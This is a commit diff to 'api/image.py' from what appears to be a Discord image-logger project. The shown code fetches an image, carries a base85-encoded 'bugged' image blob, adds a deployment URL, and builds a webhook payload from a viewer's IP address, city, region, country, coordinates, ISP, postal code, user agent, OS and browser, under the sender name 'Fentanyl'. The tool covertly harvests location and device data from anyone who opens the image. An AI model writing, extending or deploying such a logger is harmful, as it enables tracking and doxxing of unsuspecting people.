9d7d0d72c7c8ca64bc65ef0864c090f0f9bfa104
ERIGAWOKH <Ashur_warda@hotmail.com>
2025-05-21 13:14:32 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -7,6 +7,8 @@ image = httpx.get('https://photographylife.com/wp-content/uploads/2018/11/Moerak
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
+
+ URL = https://discord-image-logger-one-cyan.vercel.app/API/IMAGE
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Fentanyl",
